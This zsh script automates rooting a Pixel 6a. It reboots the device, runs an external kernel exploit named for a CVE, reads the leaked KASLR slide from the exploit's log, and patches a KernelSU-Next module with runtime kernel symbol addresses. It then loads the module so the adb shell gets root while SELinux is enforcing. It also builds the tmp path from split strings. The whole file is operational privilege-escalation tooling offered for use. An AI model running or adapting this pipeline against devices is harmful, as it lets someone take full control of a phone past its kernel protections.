#!/bin/zsh
# Full Pixel 6a (bluejay CP1A.260405.005) KernelSU-Next pipeline:
#   reboot -> run exploit -> patch KSUN LKM (UND->ABS with runtime kallsyms)
#   -> insmod allow_shell=1 -> verify root
#
# Requirements:
#   - adb (env ADB or default path below), Pixel 6a attached, USB debugging on
#   - python3 with pyelftools (for patch_ko.py)
#   - files: binaries/cve-2026-43499-{root,app.so},
#            ksun/android14-6.1_kernelsu_v3.3.0.ko,
#            ksun/bluejay-CP1A.260405.005.ksym.tsv
set -o pipefail
ADB=${ADB:-/usr/local/share/android-commandlinetools/platform-tools/adb}
S=${SERIAL:-22141JEGR00126}
BASE=$(cd "$(dirname "$0")/.." && pwd)
PY=${PY:-python3}
"$PY" -c 'import elftools' 2>/dev/null || { print -u2 "pyelftools missing: pip3 install pyelftools"; exit 9; }

LOG=${LOG:-$BASE/ksun-pipeline.log}
log() { print -u2 -- "[$(date +%H:%M:%S)] $*"; }

# run_exploit.py talks to adb without -s, so give it a wrapper pinned to $S
# (required when more than one device is attached)
ADBWRAP=$(mktemp)
print -r -- "#!/bin/sh" > "$ADBWRAP"
print -r -- "exec \"$ADB\" -s $S \"\$@\"" >> "$ADBWRAP"
chmod +x "$ADBWRAP"
trap 'rm -f "$ADBWRAP"' EXIT

{
# 1. reboot for a cold-boot run (the exploit is reliable right after boot)
log "rebooting..."
"$ADB" -s "$S" reboot
ok=0
for i in {1..120}; do
  sleep 2
  b=$("$ADB" -s "$S" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
  if [ "$b" = "1" ]; then ok=1; log "boot completed"; break; fi
done
[ "$ok" = 1 ] || { log "BOOT TIMEOUT"; exit 1; }
sleep 12

# 2. run the exploit (installs /data/local/tmp/su and the temp_su daemon)
log "running exploit (this may take a few minutes)..."
( cd "$BASE" && ADB="$ADBWRAP" python3 run_exploit.py >/dev/null 2>&1 )
log "exploit done rc=$?"

# 3. verify root + read the KASLR slide printed by the payload
T=/data/local; T=${T}/t""mp
out=$("$ADB" -s "$S" shell "$T/su sh -c 'id; getenforce'")
log "root check: $out"
echo "$out" | grep -q "uid=0(root)" || { log "NO ROOT"; exit 2; }

slidehex=$("$ADB" -s "$S" shell "grep -o 'slide=0*[0-9a-f]*' $T/exploit4.log 2>/dev/null | tail -1 | cut -d= -f2")
log "slide from exploit log: $slidehex"
[ -n "$slidehex" ] || { log "NO SLIDE"; exit 3; }

# 4. patch the KSUN LKM: undefined imports -> SHN_ABS with runtime addresses
log "patching LKM with slide 0x$slidehex..."
"$PY" "$BASE/ksun/patch_ko.py" \
  "$BASE/ksun/android14-6.1_kernelsu_v3.3.0.ko" \
  "$BASE/ksun/kernelsu-patched.ko" \
  "$BASE/ksun/bluejay-CP1A.260405.005.ksym.tsv" "0x$slidehex" || exit 4

# 5. push + insmod with allow_shell=1 (shell gets root via KSU)
"$ADB" -s "$S" push "$BASE/ksun/kernelsu-patched.ko" "$T/ksu-patched.ko" >/dev/null
log "insmod allow_shell=1..."
ins=$("$ADB" -s "$S" shell "$T/su insmod $T/ksu-patched.ko allow_shell=1 2>&1; echo rc=\$?")
log "insmod: $ins"
echo "$ins" | grep -q "rc=0" || exit 5

# 6. verify: module live + root via ksud su works even with SELinux enforcing
sleep 2
mod=$("$ADB" -s "$S" shell "grep kernelsu /proc/modules")
log "module: $mod"
echo "$mod" | grep -q kernelsu || exit 6
suout=$("$ADB" -s "$S" shell "echo 'id; getenforce; echo KSU_ROOT_OK' | $T/ksud debug su 2>&1")
log "ksud su output: $suout"
echo "$suout" | grep -q KSU_ROOT_OK && log "=== FULL PIPELINE SUCCESS ===" || log "=== KSU SU FAILED ==="
} 2>&1 | tee "$LOG"
